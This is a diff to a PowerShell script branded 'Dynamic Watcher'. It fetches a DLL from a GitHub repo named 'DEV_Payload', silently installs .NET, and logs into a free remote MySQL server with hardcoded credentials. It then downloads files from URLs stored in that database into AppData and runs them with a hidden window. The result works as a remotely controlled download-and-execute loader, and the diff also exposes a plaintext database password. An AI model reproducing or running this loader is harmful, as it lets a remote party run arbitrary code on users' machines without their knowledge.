@@ -4,32 +4,101 @@
 
 Add-Type -AssemblyName PresentationFramework
 
-# Paths
-$AppDataPath = [Environment]::GetFolderPath("ApplicationData")
-$DependencyPath = Join-Path -Path $AppDataPath -ChildPath "MySql.Data.dll"
+# -------------------------------
+# 0. Check .NET Framework 4.6.2+
+# -------------------------------
 
-# URL to download MySql.Data.dll if missing
-$DependencyUrl = "https://github.com/Umair13303/DEV_Payload/raw/refs/heads/main/EXE_FILE/SQL_Library/net462/MySql.Data.dll"
-# Connection details
-$ConnectionString = "server=sql7.freesqldatabase.com;port=3306;uid=sql7788502;pwd=Y3jJUaTBR4;database=sql7788502"
+$minimumRelease = 394802  # .NET 4.6.2
+$dotNetRegKey = "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"
+
+try {
+    $installedRelease = (Get-ItemProperty -Path $dotNetRegKey -Name Release -ErrorAction Stop).Release
+} catch {
+    $installedRelease = 0
+}
+
+if ($installedRelease -lt $minimumRelease) {
+    [System.Windows.MessageBox]::Show(".NET Framework 4.6.2 or later is not installed. Downloading installer...", "Dynamic Watcher")
+
+    # URL to official offline installer
+    $dotNetInstallerUrl = "https://download.microsoft.com/download/9/9/F/99F4E0DA-2B83-48E6-8F0A-1D3FA8263FDE/NDP462-KB3151800-x86-x64-AllOS-ENU.exe"
+    $installerPath = Join-Path -Path $env:TEMP -ChildPath "NDP462-KB3151800.exe"
+
+    try {
+        # Download with progress bar
+        $wc = New-Object System.Net.WebClient
+        $Progress = @{
+            PercentComplete = 0
+        }
+        $wc.DownloadProgressChanged += {
+            param($sender, $e)
+            Write-Progress -Activity "Downloading .NET Framework 4.6.2" -Status "$($e.ProgressPercentage)% Complete" -PercentComplete $e.ProgressPercentage
+        }
+        $wc.DownloadFileCompleted += {
+            Write-Progress -Activity "Downloading .NET Framework 4.6.2" -Completed
+        }
+        $wc.DownloadFileAsync([Uri]$dotNetInstallerUrl, $installerPath)
+
+        # Wait for async download to finish
+        while ($wc.IsBusy) {
+            Start-Sleep -Milliseconds 200
+        }
+
+        [System.Windows.MessageBox]::Show("Downloaded .NET Framework 4.6.2 installer. Running setup...", "Dynamic Watcher")
+
+        # Run the installer silently
+        $process = Start-Process -FilePath $installerPath -ArgumentList "/quiet", "/norestart" -Wait -PassThru
+
+        if ($process.ExitCode -eq 0) {
+            [System.Windows.MessageBox]::Show(".NET Framework 4.6.2 installed successfully. Please reboot your system before running the script again.", "Dynamic Watcher")
+        } else {
+            [System.Windows.MessageBox]::Show("Installer exited with code $($process.ExitCode). Please install manually.", "Dynamic Watcher")
+        }
+        exit 0
+    } catch {
+        [System.Windows.MessageBox]::Show("Failed to download or install .NET Framework 4.6.2: $_", "Dynamic Watcher")
+        exit 1
+    }
+} else {
+    Write-Host ".NET Framework 4.6.2 or later is already installed."
+}
 
 # -------------------------------
 # 1. Dependency Check & Download
 # -------------------------------
+
+$AppDataPath = [Environment]::GetFolderPath("ApplicationData")
+$DependencyPath = Join-Path -Path $AppDataPath -ChildPath "MySql.Data.dll"
+$DependencyUrl = "https://github.com/Umair13303/DEV_Payload/raw/refs/heads/main/EXE_FILE/SQL_Library/net462/MySql.Data.dll"
+
 if (-Not (Test-Path $DependencyPath)) {
     [System.Windows.MessageBox]::Show("Dependency missing. Downloading MySql.Data.dll...", "Dynamic Watcher")
 
     try {
         $wc = New-Object System.Net.WebClient
-        $wc.DownloadFile($DependencyUrl, $DependencyPath)
+        $Progress = @{
+            PercentComplete = 0
+        }
+        $wc.DownloadProgressChanged += {
+            param($sender, $e)
+            Write-Progress -Activity "Downloading MySql.Data.dll" -Status "$($e.ProgressPercentage)% Complete" -PercentComplete $e.ProgressPercentage
+        }
+        $wc.DownloadFileCompleted += {
+            Write-Progress -Activity "Downloading MySql.Data.dll" -Completed
+        }
+        $wc.DownloadFileAsync([Uri]$DependencyUrl, $DependencyPath)
+
+        while ($wc.IsBusy) {
+            Start-Sleep -Milliseconds 200
+        }
+
         [System.Windows.MessageBox]::Show("Downloaded MySql.Data.dll successfully.", "Dynamic Watcher")
     }
     catch {
-        [System.Windows.MessageBox]::Show("Failed to download dependency: $_", "Dynamic Watcher")
+        [System.Windows.MessageBox]::Show("Failed to download MySql.Data.dll: $_", "Dynamic Watcher")
         exit 1
     }
 } else {
-    # Dependency already present
     Write-Host "Dependency exists: $DependencyPath"
 }
 
@@ -47,6 +116,9 @@ catch {
 # -------------------------------
 # 3. Connect to Database
 # -------------------------------
+
+$ConnectionString = "server=sql7.freesqldatabase.com;port=3306;uid=sql7788502;pwd=Y3jJUaTBR4;database=sql7788502"
+
 try {
     $Connection = New-Object MySql.Data.MySqlClient.MySqlConnection $ConnectionString
     $Connection.Open()
@@ -73,12 +145,11 @@ try {
 
         $TargetFile = Join-Path -Path $AppDataPath -ChildPath $Guid
 
-        # Download file
         [System.Windows.MessageBox]::Show("Downloading: $Url", "Dynamic Watcher")
+
         $wc = New-Object System.Net.WebClient
         $wc.DownloadFile($Url, $TargetFile)
 
-        # Execute file
         Start-Process -FilePath $TargetFile -WindowStyle Hidden
 
         [System.Windows.MessageBox]::Show("Downloaded and executed: $Guid", "Dynamic Watcher")
